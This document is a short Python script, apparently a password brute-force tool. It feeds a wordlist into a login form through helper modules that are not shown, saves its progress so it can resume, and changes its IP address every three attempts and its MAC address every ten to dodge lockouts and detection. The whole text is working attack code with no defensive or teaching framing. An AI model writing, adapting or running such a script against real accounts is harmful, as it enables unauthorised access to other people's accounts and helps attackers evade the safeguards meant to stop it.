from insert_to_form import Insert , Check , First_shot
from change_mac_address import MAC
from change_ip import IP 
from time import sleep

window = First_shot()

# LOAD THE STEP
with open("save.txt", 'r') as save:
    start = s = int(save.read())


with open("passwords.txt", 'r') as file:
        passwords = file.readlines()

        for num, password in enumerate(passwords[start:]):
            Insert(password.strip()+'\n')
            Check(window)
 
            # sleep(0.5)

            s+=1
            with open("save.txt", 'w') as save:
                save.write(str(s))

            if num%3==0:
                IP()
            if num%10==0:
                MAC()
                break



